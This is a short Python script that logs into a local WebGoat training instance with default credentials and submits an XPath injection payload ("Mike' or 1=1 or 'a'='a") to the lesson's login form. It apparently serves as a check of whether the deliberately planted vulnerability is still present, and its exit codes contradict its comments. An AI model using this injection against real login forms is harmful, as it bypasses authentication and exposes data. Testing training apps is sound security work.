import requests
import sys
import json

# WebGoat login page URL
URL = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'

def main():
    # Start session
    session = requests.session()

    # Login info for WebGoat
    USERNAME = 'webgoat'
    PASSWORD = 'webgoat'

    # List containing login information for WebGoat
    login_data = {
        'username': USERNAME,
        'password': PASSWORD
    }

    # Landing on the WebGoat Login Page
    r = session.get('http://127.0.0.1:8080/WebGoat/login.mvc')

    # Authenticate on the WebGoat login page using the webgoat login information
    r = session.post(URL, data=login_data)

    # Need to get menu item link for our vulnerability lesson (XPATH injection)
    JSON_URL = 'http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc'
    r = session.get(JSON_URL)
    parsed_json = json.loads(r.text)
    # menu_request_name = parsed_json[10]["children"][3]["name"]
    menu_request_link = parsed_json[10]["children"][3]["link"]

    # Store the URL for the XPATH Injection from Injection lesson 
    LESSON_URL = 'http://127.0.0.1:8080/WebGoat/' + menu_request_link
    r = session.get(LESSON_URL)
    
    # Information of our XPATH injection
    EMPLOYEE_NAME = "Mike' or 1=1 or 'a'='a"
    ACTION = 'Submit'
    PASSWORD = 'test123'

    login_data = {
        'Username' : EMPLOYEE_NAME,
        'Password' : PASSWORD,
        'SUBMIT' : ACTION
    }
    
    # Log in and carry out our attack
    r = session.post(LESSON_URL, data=login_data)

    # Return 0 if the vulnerability is present
    # Return 1 if the vulnerability has been fixed
    
    if 'Congratulations' in r.text:
        print('1: vulnerability present') # vulnerability present
        print('We were able to obtain the following information as a result of our attack:')
        print(r.text)
        exit(1)
    else:
        print('0: vulnerability not present') # vulnerability not present, it's been fixed!
        exit(0)

if __name__ == '__main__':
    main()
